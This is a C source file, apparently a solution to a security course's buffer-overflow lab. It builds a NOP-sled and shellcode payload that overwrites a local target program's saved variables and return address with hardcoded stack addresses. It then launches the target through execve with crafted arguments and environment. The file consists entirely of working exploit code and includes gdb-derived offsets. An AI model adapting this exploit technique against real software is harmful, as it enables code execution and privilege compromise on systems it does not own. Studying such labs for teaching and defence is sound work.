#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

// rip at 0x3021fea8
// p &buf : $1 = (char (*)[156]) 0x3021fdf0
// p &len : $2 = (int *) 0x3021fe9c
// p &i : $3 = (int *) 0x3021fe98
// Buffer size is 189 as the difference between the rip and buf is 188
// 184 + 4 (return address) = 188
// 188 + 1 for the '\0' = 189

#define TARGET "../targets/target4"
#define BUFFER_SIZE 189
#define NOP 0x90
#define RETURN_ADDRESS "\xf0\xfd\x21\x30"
#define ZEROS "\x00"
#define I_ADDRESS "\xa4"
#define LEN_ADDRESS "\xb8"

int main(void)
{
  char * args[3];
  char * env[6];

  char bufferExploit[BUFFER_SIZE];

  // Fill the buffer exploit with NOPs and shellcode
  memset(bufferExploit, NOP, BUFFER_SIZE);
  memcpy(bufferExploit, shellcode, strlen(shellcode));
  
  // Fill the buffer exploit with the respective i, len and return addresses  
  memcpy(&bufferExploit[168], I_ADDRESS, 4);  
  memcpy(&bufferExploit[172], LEN_ADDRESS, 4);
  memcpy(&bufferExploit[184], RETURN_ADDRESS, 4);

  // Fill last entry of buffer exploit with \0
  bufferExploit[188] = '\0';

  args[0] = TARGET; 
  //args[1] = "hi there"; 
  args[1] = bufferExploit;
  args[2] = NULL;

  // Write 6 environment variables
  // Env 2 and 5 are pointed to the address of the buffer exploit
  // at the len address and after len address
  env[0] = ZEROS;
  env[1] = ZEROS;
  env[2] = &bufferExploit[172];
  env[3] = ZEROS;
  env[4] = ZEROS;
  env[5] = &bufferExploit[176];

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
